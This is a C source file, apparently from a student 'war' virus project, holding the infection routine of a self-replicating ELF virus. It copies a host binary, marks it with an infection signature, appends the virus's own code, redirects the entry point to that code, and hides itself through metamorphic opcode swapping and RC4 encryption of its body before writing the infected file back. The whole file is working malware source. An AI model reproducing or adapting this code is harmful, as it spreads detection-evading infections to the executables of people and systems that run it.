/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/04 16:00:11 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void		inject(t_data *data)
{

	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);

#ifdef DEBUG
	char de[] = "inject\t \n";
	data->context == true ?	de[7] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	if (data->context == false || data->context != true)
		goto ERR;

	data->context = false;
	int				size = data->virus.size + data->virus.note->p_offset;
	uint8_t			*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (map == MAP_FAILED)
		goto ERR;


	register int	off = 0;
	int				lim = 0;
	uint8_t			*dst = map;
	uint8_t			*src = data->bin.map;


	//	step 1 : copy
	lim = data->virus.data->p_offset + data->virus.data->p_filesz;
	while (off < lim)
	{
		*dst++ = *src++;
		off++;
	}


	// step 2 : insert signature
	data->header = (Elf64_Ehdr*)map;
	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;


	// step 3 : pad
	lim = data->virus.note->p_offset;
	while (off < lim)
	{
		*dst++ = 0;
		off++;
	}


	// step 4 : inject itself
	uint8_t *beg = (uint8_t*)start;
	for (register int i = 0 ; i < (int)data->virus.size ; i++)
	{
		*dst++ = *beg++;
		off++;
	}

	// step 5 : patch entrypoint
	dst -= ((size_t)end_of_data - (size_t)end);
	while (*dst != 0xe9)
		dst++;
	if ((void*)dst >= (void*)data->bin.map + data->bin.size)
		goto ERR;


	data->bin_entry = data->bin_entry - data->vrs_entry - (data->virus.size - ENTRY_OFF);
	if (_memcpy(dst + 1, &data->bin_entry, 4) != dst + 1)
		goto ERR;


	// step 5.5 : encrypt infected inject()
	dst = map + (data->virus.note->p_offset + ((size_t)inject - (size_t)start));
	revert_two(&data->key, (char*)dst, (size_t)release - (size_t)inject);


	// step 5.6 : metamorph rc4
	#define LEN 8
	uint16_t oc[LEN] = {
		0x5850, // rax
		0x5951, // rcx
		0x5a52,	// rdx
		0x5b53, // rbx
		0x5c54,	// rsp
		0x5d55, // rbp
		0x5e56, // rsi
		0x5f57
	};

	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
	lim = (size_t)end_of_data - (size_t)_rc4;
	while (lim > 0)
	{
	 	for (register int i = 0 ; i < LEN ; i++)
		{
			if (oc[i] == *(uint16_t*)dst)
			{
				*(uint16_t*)dst = oc[_random_number(LEN)];
				dst++;
				break ;
			}
		}
		dst++;
		lim--;
	}


	//	step 6 : Encrypt data : begin at opening() -> end lib
	// generate new key
	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
	_memcpy(data->cpr_key, dst, KEY_SIZE);

	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening);


	// final : write
	_write(data->bin.fd, map, size);
	data->context = true;


ERR:
	_munmap(map, size);
	update_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);
	revert_one(&data->key, (char*)release, (size_t)end  - (size_t)release);
	release(data);
}
